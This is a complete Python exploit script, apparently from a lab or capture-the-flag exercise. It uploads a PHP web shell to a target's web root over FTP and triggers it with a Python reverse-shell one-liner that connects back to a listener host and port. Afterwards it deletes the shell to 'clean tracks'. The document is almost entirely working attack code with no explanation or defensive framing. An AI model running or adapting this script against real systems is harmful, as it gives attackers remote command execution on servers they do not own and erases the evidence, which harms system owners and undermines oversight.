#!/usr/bin/env python3

import requests
import ftplib
import sys
import uuid
import os

args = sys.argv[1:]

if len(args) != 3:
    print(f'{__file__} <target_ip> <listen_host> <listen_port>')
    exit(1)

IP = args[0]
RHOST = args[1]
RPORT = int(args[2])

FTP_USER = 'USER'       # CHANGE THIS !!!
FTP_PASS = 'PASS'       # CHANGE THIS !!!

def send_shell():
    print('+ SENDING SHELL TO SERVER')

    file_id = str(uuid.uuid4())
    file = f'{file_id}.php'
    text = "<?php system($_GET['cmd']); ?>".encode('utf-8')

    with open(file, 'wb') as f:
        f.write(text)
        f.close()

    file_stream = open(file, 'rb')

    with ftplib.FTP() as ftp:
        ftp.connect(IP, 2121)
        ftp.login(FTP_USER, FTP_PASS)
        ftp.storbinary('STOR /var/www/html/arquivos/shell.php', file_stream)
        ftp.quit()

    file_stream.close()
    os.remove(file)
    print('+ SHELL SENT TO SERVER')

def clean_tracks():
    with ftplib.FTP() as ftp:
        ftp.connect(IP, 2121)
        ftp.login(FTP_USER, FTP_PASS)
        ftp.delete('/var/www/html/arquivos/shell.php')
        ftp.quit()

def exploit():
    send_shell()

    print('* RUNNING EXPLOIT')

    payload = f"export RHOST=\"{RHOST}\";export RPORT={RPORT};python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    url = f"http://{IP}/arquivos/shell.php?cmd={payload}"

    try:
        requests.get(url, timeout=3)
    except requests.exceptions.ReadTimeout:
        pass

    print('+ TARGET EXPLOITED SUCCESFULLY')

    print('+ CLEANING TRACKS')

    clean_tracks()

    print('+ ALL DONE')

if __name__ == '__main__':
    exploit()

